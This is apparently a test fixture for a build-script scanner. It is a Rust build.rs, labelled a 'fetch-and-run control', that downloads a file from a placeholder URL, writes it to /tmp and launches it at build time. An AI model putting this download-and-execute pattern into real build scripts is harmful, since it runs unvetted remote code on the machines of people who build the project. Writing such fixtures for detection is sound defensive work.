// Fetch-and-run control: a build script that downloads a payload,
// writes it out, and launches it stays inside
// build-rs-fetches-and-runs-payload.
use std::process::Command;

fn main() {
    let data = ureq::get("https://example.com/tool")
        .call()
        .unwrap()
        .into_body()
        .read_to_vec()
        .unwrap();
    std::fs::write("/tmp/tool", &data).unwrap();
    Command::new("/tmp/tool").spawn().unwrap();
}
